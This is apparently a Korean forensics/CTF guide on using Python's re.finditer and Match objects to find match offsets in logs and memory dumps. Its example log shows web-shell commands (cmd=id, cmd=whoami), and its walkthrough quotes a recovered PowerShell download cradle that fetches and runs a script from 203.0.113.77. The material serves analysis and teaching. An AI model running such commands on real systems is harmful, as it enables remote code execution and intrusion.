---
id: FOR-0123
title: "Python re.finditer와 Match 객체: 매칭 위치까지 얻는다"
slug: "python-re-finditer"
category: "로그/Regex"
type: "guide"
difficulty: "basic"
priority: "critical"
platform: [windows, linux]
artifact: ["memory dump", "strings dump", "access.log", "text log"]
file_paths: ["/var/log/auth.log", "/var/log/syslog"]
registry_paths: []
event_ids: []
protocols: []
tools: ["Python", "re", "mmap"]
commands: ["python find_offsets.py dump.raw", "python -c \"import re;print([m.span() for m in re.finditer(r'PK', open('a.zip','rb').read().decode('latin-1'))][:5])\""]
regex_patterns: ["flag\\{[^}]{1,64}\\}", "(?=(\\d{4}))", "-----BEGIN [A-Z ]+-----"]
wireshark_filters: []
tshark_fields: []
log_fields: ["start", "end", "span", "group", "lastgroup"]
file_formats: ["log", "txt", "raw", "bin"]
primary_terms: ["re.finditer", "Match 객체", "매칭 위치"]
keywords: ["re.finditer", "Match object", "group", "groups", "groupdict", "start", "end", "span", "re.sub 함수", "re.split", "overlapping match", "오프셋"]
aliases: ["python finditer", "파이썬 매칭 위치", "정규식 오프셋", "match 객체 사용법", "python re span", "겹치는 매칭"]
symptom_keywords: ["매칭된 위치를 알고 싶다", "몇 번째 바이트인지 알아야 한다", "findall로는 부족하다", "치환할 때 계산이 필요하다", "매칭 주변 문맥을 보고 싶다", "겹치는 패턴이 안 잡힌다"]
related: ["FOR-0122", "FOR-0124", "FOR-0119"]
source_ids: ["SRC-057"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

`re.finditer`는 문자열 대신 **`Match` 객체를 하나씩 흘려주는 이터레이터**이므로, `m.group()`으로 값을, `m.start()`/`m.span()`으로 위치를, `m.groupdict()`로 필드 이름을 동시에 얻는다. 위치·메모리·이름 중 하나라도 필요하면 `findall`이 아니라 `finditer`가 답이다.

## 어떤 문제에서 필요한가

- 메모리 덤프나 디스크 이미지에서 찾은 문자열의 **오프셋**을 답해야 하는 상황
- 매칭 주변 문맥(앞뒤 수십 바이트)을 함께 봐야 판단이 되는 상황
- 수 GB 파일에서 매칭이 수십만 건이라 리스트로 담으면 메모리가 터지는 상황
- 캡처 그룹이 여러 개인데 인덱스가 아니라 **이름**으로 접근하고 싶은 상황
- 치환값을 계산해서 넣어야 하는 상황 (`re.sub`에 함수 전달)
- 겹치는 매칭을 세야 하는 상황

## 문제에서 처음 볼 단서

1. 문제 지문의 "오프셋", "몇 번째 바이트", "위치", "주소" — 전부 `finditer`다
2. `findall`로 값은 나왔는데 "그게 파일 어디냐"를 못 답하는 순간
3. 파일이 텍스트가 아니라 `.raw` `.mem` `.dd` `.bin` 이면 바이트 모드로 간다
4. 같은 문자열이 여러 번 나오는데 어느 것이 정답인지 문맥으로 골라야 하는 상황

`findall`과 `finditer`는 같은 패턴, 같은 매칭 집합을 본다. 다른 것은 **무엇을 돌려주는가**뿐이다.

```python
import re
s = 'user=admin id=1001 user=guest id=1002'

re.findall(r'user=(\w+)', s)
# ['admin', 'guest']

[(m.start(), m.group(0), m.group(1)) for m in re.finditer(r'user=(\w+)', s)]
# [(0, 'user=admin', 'admin'), (19, 'user=guest', 'guest')]
```

`findall`은 값만, `finditer`는 값과 위치와 전체 매칭을 모두 준다.

## 30초 절차

```python
import re

text = open('strings.txt', encoding='utf-8', errors='replace').read()
for m in re.finditer(r'flag\{[^}]{1,64}\}', text):
    print(m.start(), m.end(), m.group(0))
```

```text
40912 40941 flag{n0t_th3_r34l_0n3}
812004 812038 flag{f1nd1t3r_g1v3s_y0u_0ffs3ts}
```

같은 패턴이 두 건 잡혔다. 어느 것이 정답인지는 **주변 문맥**으로 가른다.

```python
for m in re.finditer(r'flag\{[^}]{1,64}\}', text):
    lo, hi = max(0, m.start() - 60), m.end() + 60
    print(f'--- offset {m.start()} ---')
    print(text[lo:hi].replace('\n', ' | '))
```

```text
--- offset 40912 ---
# decoy list, do not submit | flag{n0t_th3_r34l_0n3} | flag_check=False
--- offset 812004 ---
[+] auth ok uid=1000 | flag{f1nd1t3r_g1v3s_y0u_0ffs3ts} | [+] session closed
```

`decoy`라는 단어가 앞에 붙은 쪽을 버린다. 오프셋이 있어야 이 판단이 가능하다.

## 상세 절차

### 1단계 — `Match` 객체의 메서드 표

| 호출 | 반환 | 용도 |
| --- | --- | --- |
| `m.group()` / `m.group(0)` | 매칭 전체 문자열 | 원문 그대로 확인 |
| `m.group(1)` | 1번 캡처 그룹 | 값 추출 |
| `m.group('ip')` | 명명 그룹 | 이름으로 접근 |
| `m[0]`, `m[1]`, `m['ip']` | `group()`과 동일 | 짧게 쓰기 |
| `m.groups()` | 모든 캡처 그룹의 튜플 | 언패킹 `a, b = m.groups()` |
| `m.groupdict()` | 명명 그룹의 dict | CSV·표로 바로 변환 |
| `m.start()` / `m.start(1)` | 시작 인덱스 (전체 / 그룹) | 오프셋 답안 |
| `m.end()` / `m.end(1)` | 끝 인덱스 (매칭 다음 위치) | 슬라이싱 |
| `m.span()` / `m.span(1)` | `(start, end)` 튜플 | 한 번에 |
| `m.string` | 검색 대상 원본 문자열 | 문맥 잘라 보기 |
| `m.re` | 컴파일된 패턴 객체 | 어느 패턴이 걸렸는지 |
| `m.lastindex` | 마지막으로 매칭된 그룹 번호 | 선택 분기 판별 |
| `m.lastgroup` | 마지막으로 매칭된 명명 그룹 이름 | 분류 태깅 |

`m.end()`는 **매칭 다음 위치**다. 그래서 `text[m.start():m.end()]`가 정확히 매칭 문자열이 되고, 매칭 길이는 `m.end() - m.start()`다. 오프셋 답안을 쓸 때 `end`를 마지막 문자 위치로 착각하면 값이 1 어긋난다.

```python
import re
m = re.search(r'\d+', 'id=1001;')
m.span()                 # (3, 7)
m.group()                # '1001'
m.string[m.start():m.end()]   # '1001'
m.end() - m.start()      # 4
```

### 2단계 — `findall` 대신 `finditer`를 쓰는 세 가지 이유

| 이유 | `findall` | `finditer` |
| --- | --- | --- |
| 위치 | 없다 | `start` / `end` / `span` |
| 메모리 | 전체 결과 리스트를 만든다 | 이터레이터. 한 건씩 처리 |
| 전체 + 그룹 동시 | 그룹이 있으면 전체를 못 받는다 | `group(0)`과 `group(1)`을 같이 |
| 명명 그룹 | 이름 무시, 튜플만 | `groupdict()` |
| 조기 종료 | 다 훑은 뒤 자른다 | `break`로 즉시 멈춘다 |

수십만 건에서 앞의 다섯 건만 필요할 때 차이가 크다.

```python
import re
PAT = re.compile(r'-----BEGIN [A-Z ]+-----')

with open('huge.txt', encoding='utf-8', errors='replace') as f:
    text = f.read()

for i, m in enumerate(PAT.finditer(text)):
    print(m.start(), m.group())
    if i >= 4:
        break          # 여기서 스캔이 멈춘다. findall 은 이미 다 훑었다
```

값 추출만 하고 위치가 필요 없다면 `findall`이 더 짧다. 선택 기준은 그것뿐이다. 패턴 자체를 다듬는 문제라면 [FOR-0128](./ipv4-regex.html)의 IP 패턴 비교표가 출발점이고, `.NET` 쪽에서 같은 일을 하는 `MatchInfo` 객체는 [FOR-0121](./powershell-select-string.html)에 정리돼 있다.

### 3단계 — 오프셋으로 원문 문맥 잘라 보기

조사에서 매칭 그 자체보다 중요한 것이 **그 주변**이다.

```python
import re

def context(text, m, width=80):
    lo = max(0, m.start() - width)
    hi = min(len(text), m.end() + width)
    return text[lo:m.start()], m.group(0), text[m.end():hi]

text = open('access.log', encoding='utf-8', errors='replace').read()
for m in re.finditer(r'cmd=[^ &"]+', text):
    before, hit, after = context(text, m, 60)
    print(f'[{m.start()}] ...{before[-60:]}>>>{hit}<<<{after[:60]}...')
```

```text
[982114] ...113.77 - - [14/Mar/2026:07:20:15 +0900] "GET /uploads/av4tar.php?>>>cmd=id<<< HTTP/1.1" 200 42 ...
[982203] ...113.77 - - [14/Mar/2026:07:20:31 +0900] "GET /uploads/av4tar.php?>>>cmd=whoami<<< HTTP/1.1" 200 38 ...
```

줄 번호가 필요하면 매칭 이전 구간의 줄바꿈을 센다.

```python
lineno = text.count('\n', 0, m.start()) + 1
```

이 방법은 `read()`로 읽은 전체 문자열에서만 성립한다. 줄 단위로 순회하면 `enumerate(f, 1)`로 줄 번호를 직접 센다.

### 4단계 — 문자 오프셋과 바이트 오프셋은 다르다

`str` 모드의 `m.start()`는 **문자 인덱스**다. 파일 안의 바이트 오프셋을 답해야 하면 바이너리로 열어 바이트 패턴을 쓴다.

```python
import re

# 바이트 오프셋 — 이미지·덤프에서 답할 수 있는 값
with open('memdump.raw', 'rb') as f:
    data = f.read()
for m in re.finditer(rb'flag\{[^}]{1,64}\}', data):
    print(hex(m.start()), m.group().decode('ascii', 'replace'))
```

```text
0x1f3a40 flag{byt3_0ffs3t_1s_wh4t_th3y_w4nt}
```

| 모드 | 패턴 접두사 | `m.start()`의 의미 | 언제 |
| --- | --- | --- | --- |
| 텍스트 (`'r'`, `encoding=`) | `r'...'` | 문자 인덱스 | 로그 분석, 줄 번호 |
| 바이너리 (`'rb'`) | `rb'...'` | 바이트 오프셋 | 이미지·덤프, 헥스 편집기와 대조 |

ASCII만 있는 파일이면 두 값이 같다. 한글이 하나라도 섞이면 UTF-8에서 3바이트를 차지하므로 문자 인덱스와 바이트 오프셋이 어긋난다. **오프셋을 답으로 제출할 때는 반드시 바이너리 모드로 다시 확인한다.**

`errors='ignore'`로 열면 깨진 바이트가 사라지면서 이후 모든 인덱스가 밀린다. 오프셋을 다룰 때 `'ignore'`는 금지다.

GB 단위 파일은 `mmap`으로 전체 읽기를 피한다.

```python
import mmap, re

with open('image.dd', 'rb') as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    for m in re.finditer(rb'\x89PNG\r\n\x1a\n', mm):
        print('PNG header at', hex(m.start()))
```

카빙 대상 헤더의 오프셋이 그대로 나온다.

### 5단계 — `re.sub`에 함수를 넘긴다

치환값을 계산해야 할 때, `re.sub`의 두 번째 인자에 **함수**를 준다. 함수는 `Match` 객체를 받아 문자열을 반환한다.

```python
import re
from datetime import datetime, timezone, timedelta

KST = timezone(timedelta(hours=9))

def to_kst(m):
    dt = datetime.strptime(m.group(0), '%Y-%m-%dT%H:%M:%SZ').replace(tzinfo=timezone.utc)
    return dt.astimezone(KST).strftime('%Y-%m-%d %H:%M:%S KST')

line = '2026-03-14T09:58:44Z ERROR 인증 서버 응답 없음'
print(re.sub(r'\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z', to_kst, line))
```

```text
2026-03-14 18:58:44 KST ERROR 인증 서버 응답 없음
```

UTC 로그를 KST로 통째로 옮기는 데 이 세 줄이면 끝난다. `Z` 접미사가 UTC를 뜻하고, KST는 UTC+9다.

Base64 후보를 즉석 디코딩해 붙이는 것도 같은 방식이다.

```python
import base64, re

def decode_b64(m):
    try:
        raw = base64.b64decode(m.group(0), validate=True)
        return f'{m.group(0)}  <== {raw.decode("utf-8", "replace")}'
    except Exception:
        return m.group(0)

print(re.sub(r'[A-Za-z0-9+/]{20,}={0,2}', decode_b64, 'cmd=cG93ZXJzaGVsbCAtZW5jIEFB'))
```

```text
cmd=cG93ZXJzaGVsbCAtZW5jIEFB  <== powershell -enc AA
```

치환 문자열(함수가 아닌 경우)에서는 `\1`, `\g<1>`, `\g<name>`으로 그룹을 참조한다. 함수를 넘길 때는 이런 이스케이프 규칙을 신경 쓸 필요가 없다는 것이 또 하나의 장점이다.

`re.subn`은 `(결과문자열, 치환횟수)` 튜플을 준다. 몇 건을 바꿨는지 확인해야 할 때 쓴다.

### 6단계 — `re.split`과 겹치는 매칭

`re.split(pattern, string, maxsplit=0)`은 패턴 기준으로 자른다. **패턴에 캡처 그룹이 있으면 구분자도 결과에 포함된다.**

```python
import re

re.split(r'\s*[;,]\s*', 'a ; b, c')        # ['a', 'b', 'c']
re.split(r'\s*([;,])\s*', 'a ; b, c')      # ['a', ';', 'b', ',', 'c']
re.split(r'(?<=\])\s+', '[07:19:02] msg')  # ['[07:19:02]', 'msg']
```

구분자가 무엇이었는지 알아야 하면 그룹을 넣고, 아니면 `(?:...)`로 감싼다. 후방탐색 `(?<=...)`은 폭이 0이므로 구분자를 남긴 채 자를 수 있다.

`finditer`와 `findall`은 모두 **겹치지 않는** 매칭만 준다. 겹치는 매칭이 필요하면 폭이 0인 전방탐색 안에 캡처를 넣는다.

```python
import re
s = '123456'

re.findall(r'\d{4}', s)                # ['1234']            겹치지 않음
[m.group(1) for m in re.finditer(r'(?=(\d{4}))', s)]
# ['1234', '2345', '3456']             겹치는 전부
```

`(?=(...))`는 위치를 소비하지 않으므로 매칭 시작점이 한 칸씩만 전진한다. 카드번호 후보, 슬라이딩 윈도우 해시 탐색에 쓴다. 대신 문자열 길이만큼 시도하므로 큰 파일에서는 느리다.

## 출력 필드 해석

`finditer` 결과를 다루다 만나는 값들이다.

| 상황 | 결과 | 주의 |
| --- | --- | --- |
| 매칭 없음 | 빈 이터레이터 (for 문이 0번 실행) | `None`이 아니다. `if not list(it)`로 확인하면 이터레이터가 소진된다 |
| 이터레이터 재사용 | 두 번째 for 문은 0번 실행 | 두 번 돌려야 하면 `list(...)`로 고정한다 |
| 매칭 안 된 그룹 | `m.group(n)`이 `None` | `findall`은 `''`, `finditer`는 `None`. 이 차이가 `TypeError`를 만든다 |
| `m.groupdict()`의 미매칭 키 | 값이 `None` | `groupdict(default='')`로 기본값 지정 |
| `m.end()` | 매칭 다음 위치 | 마지막 문자 위치가 아니다 |
| `m.start(1)` | 1번 그룹의 시작 위치 | 그룹이 미매칭이면 `-1` |
| `m.lastgroup` | 마지막 매칭 명명 그룹 이름 | 어느 분기가 걸렸는지 판별 |

미매칭 그룹이 `None`인 것을 잊으면 바로 터진다.

```python
import re
m = re.search(r'user=(\w+)(?: id=(\d+))?', 'user=admin')
m.group(2)              # None
int(m.group(2))         # TypeError: int() argument must be ... not 'NoneType'
int(m.group(2) or 0)    # 0    이렇게 방어한다
```

## pivot: 다음에 볼 artifact

| finditer로 얻은 것 | 다음 목표 |
| --- | --- |
| 바이트 오프셋 | 헥스 편집기로 그 오프셋 이동. 헤더·푸터 확인 후 카빙 |
| 문자 오프셋 + 줄 번호 | 그 줄 앞뒤 문맥, 같은 세션의 다른 요청 |
| `m.lastgroup` 분류 | 공격 유형별 건수 집계 |
| 매칭 간 간격 | 자동화 여부 판정. 간격이 일정하면 스크립트 |
| 디코딩된 Base64 | 명령·URL·자격증명 → EVTX 4104 / 4688 대조 |
| 발견한 매직 바이트 오프셋 | 카빙 범위 결정 |
| 시각 문자열 | UTC/KST 확정. `Z`는 UTC, `+0900`은 KST |

## 흔한 함정

- **이터레이터를 두 번 도는 것.** `finditer`의 결과는 한 번 소진되면 끝이다. 두 번째 for 문은 아무것도 실행하지 않는다. 왜 틀리나: 제너레이터의 상태가 소진 상태로 남는다. 어떻게: 두 번 이상 쓸 것은 `matches = list(PAT.finditer(text))`로 고정한다.
- **`m.end()`를 마지막 문자 위치로 보는 것.** `end`는 매칭 다음 위치다. 오프셋 답이 1 어긋난다. 길이는 `end - start`, 마지막 문자 위치는 `end - 1`이다.
- **문자 오프셋을 바이트 오프셋으로 제출하는 것.** UTF-8에서 한글은 3바이트다. 한글이 섞인 파일에서 두 값은 다르다. 오프셋을 제출할 때는 `'rb'` + `rb'...'`로 다시 확인한다.
- **`errors='ignore'`로 열고 오프셋을 쓰는 것.** 버려진 바이트만큼 이후 인덱스가 전부 밀린다. `'replace'`는 문자 하나로 대체하므로 상대적으로 안전하지만, 정확한 바이트 오프셋은 바이너리 모드에서만 나온다.
- **미매칭 그룹을 문자열로 다루는 것.** `finditer`는 미매칭 그룹에 `None`을 준다(`findall`은 `''`). `int(m.group(2))`가 `TypeError`로 죽는다. `m.group(2) or 0`, `m.groupdict(default='')`로 방어한다.
- **겹치는 매칭을 기대하는 것.** `finditer`는 겹치지 않는 매칭만 준다. `'123456'`에서 `\d{4}`는 1건이다. 겹치는 전부가 필요하면 `(?=(\d{4}))`를 쓴다.
- **`re.split`에 캡처 그룹을 남기는 것.** 구분자가 결과 리스트에 끼어들어 필드 개수가 두 배가 된다. 구분자가 필요 없으면 `(?:...)`로 감싼다.
- **`re.sub` 치환 문자열에서 `\1`을 잘못 쓰는 것.** 일반 문자열에서는 `'\1'`이 제어문자가 된다. 항상 raw 문자열 `r'\1'` 또는 `r'\g<name>'`을 쓴다. 계산이 필요하면 함수를 넘긴다.
- **큰 파일을 `read()`로 통째 올리고 `finditer`를 도는 것.** `finditer`가 이터레이터여도 대상 문자열은 이미 메모리에 있다. GB 단위는 `mmap` + 바이트 패턴이다.
- **`(?=(...))`를 큰 파일에 쓰는 것.** 모든 위치에서 시도하므로 O(n) 시도가 발생해 매우 느리다. 대상 구간을 먼저 좁힌 뒤에만 쓴다.

## 교차검증

오프셋은 반드시 다른 도구로 확인한다. 한 자리만 어긋나도 오답이다.

```python
import re
data = open('memdump.raw', 'rb').read()
for m in re.finditer(rb'flag\{', data):
    print(hex(m.start()))
```

```bash
# grep 로 바이트 오프셋 (-b) 확인
grep -aob 'flag{' memdump.raw | head

# xxd 로 해당 오프셋을 직접 열어 본다 (0x1f3a40 = 2046528)
xxd -s 2046528 -l 64 memdump.raw
```

```text
001f3a40: 666c 6167 7b62 7974 335f 3066 6673 3374  flag{byt3_0ffs3t
001f3a50: 5f31 735f 7768 3474 5f74 6833 795f 7734  _1s_wh4t_th3y_w4
```

`grep -b`의 오프셋과 `m.start()`가 같아야 한다. 다르면 텍스트 모드로 읽었거나 인코딩 변환이 끼어든 것이다. 헥스 편집기에서 같은 오프셋으로 이동해 눈으로 확인하는 것이 최종 확증이다.

## mini walkthrough

```text
문제:
"메모리 덤프에서 공격자가 사용한 PowerShell 명령을 찾고, 그 문자열이 시작되는
 오프셋을 16진수로 제출하세요."
첨부: memdump.raw (4.0GB)

1. 첫 시도 (실패):
   text = open('memdump.raw', encoding='utf-8', errors='replace').read()
   -> 몇 분 뒤 MemoryError. 4GB 파일을 str 로 디코딩하면
      문자당 최대 4바이트가 되어 원본보다 더 커진다.

2. 두 번째 시도 (부분 실패) — errors='replace' 로 크기를 줄이려 해도 같다.
   접근 자체가 틀렸다. 바이너리 + mmap 으로 바꾼다.

   import mmap, re
   f = open('memdump.raw', 'rb')
   mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)

3. 세 번째 시도 (0건) — ASCII 로만 찾았다
   list(re.finditer(rb'powershell', mm))[:3]
   -> []   0건.

   원인: Windows 프로세스 메모리의 명령행은 UTF-16LE 다.
        'powershell' 은 70 00 6f 00 77 00 ... 로 들어 있다.

4. 접근 변경 — UTF-16LE 패턴을 만든다
   pat = re.compile(b'p\x00o\x00w\x00e\x00r\x00s\x00h\x00e\x00l\x00l\x00', re.I)
   hits = [m.start() for m in pat.finditer(mm)]
   print(len(hits), [hex(h) for h in hits[:3]])
   -> 217 ['0x8a1c220', '0x8a1c9e0', '0x91b3110']

5. 문맥을 잘라 인코딩된 명령을 찾는다
   for m in pat.finditer(mm):
       chunk = mm[m.start():m.start() + 600]
       s = chunk.decode('utf-16-le', 'replace')
       if '-enc' in s.lower() or '-encodedcommand' in s.lower():
           print(hex(m.start()), s.split('\x00')[0][:200])
           break
   -> 0x91b3110 powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA...

6. 디코딩
   import base64
   b64 = 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA...'
   print(base64.b64decode(b64).decode('utf-16-le', 'replace'))
   -> IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.77/a.ps1')

   PowerShell 의 -EncodedCommand 는 UTF-16LE 를 Base64 로 감싼 것이다.

7. 교차검증
   grep -aob 'p.o.w.e.r.s.h.e.l.l' memdump.raw | head
   xxd -s 152426256 -l 48 memdump.raw
   -> 0x91b3110 = 152426256. 같은 위치에서 같은 바이트 확인.

정답: 오프셋 0x91b3110 /
      명령 IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.77/a.ps1')
```

1단계와 3단계가 교훈이다. **큰 바이너리는 str로 읽지 않는다. 그리고 Windows 메모리의 문자열은 UTF-16LE라고 먼저 가정한다.**

## 막혔을 때 다음 체크

1. 위치가 필요한가 값만 필요한가 — 값만이면 `findall`이 더 짧다
2. 이터레이터를 두 번 돌고 있지 않은가 — `list()`로 고정했는가
3. 오프셋을 제출할 것이면 `'rb'` + `rb'...'`로 다시 뽑았는가
4. `m.end()`를 마지막 문자 위치로 쓰고 있지 않은가
5. 미매칭 그룹이 `None`인 것을 방어했는가
6. 바이너리에서 0건이면 UTF-16LE를 시도했는가 (`p\x00o\x00...`)
7. 큰 파일이면 `mmap`으로 바꿨는가
8. 겹치는 매칭이 필요하면 `(?=(...))`로 바꿨는가
9. `re.split` 결과에 구분자가 끼어 있지 않은가
10. `grep -aob` 오프셋과 `xxd`로 교차검증했는가
11. 문맥을 잘라 보고 decoy를 걸렀는가
12. 시각 문자열이 있으면 UTC/KST를 확정했는가

## 출처

- SRC-057 — Python 공식 문서 `re` 모듈: `finditer` 반환형, `Match` 객체의 `group`/`groups`/`groupdict`/`start`/`end`/`span`/`lastindex`/`lastgroup`, `re.sub`에 함수 전달, `re.split`의 캡처 그룹 포함 규칙, 겹치지 않는 매칭 원칙
- `mmap`, `base64`, `datetime` 사용법은 같은 Python 표준 라이브러리 문서 계열에서 확인했다
- PowerShell `-EncodedCommand`가 UTF-16LE 기반 Base64라는 점은 널리 확인된 동작이지만, 이 글의 `source_ids`에는 해당 1차 출처가 없다. `research/sources.json`에 Microsoft Learn의 `powershell.exe` 명령행 파라미터 문서를 추가하면 인용을 붙일 수 있다
- 예시 오프셋과 flag 문자열은 설명용 가상 데이터다
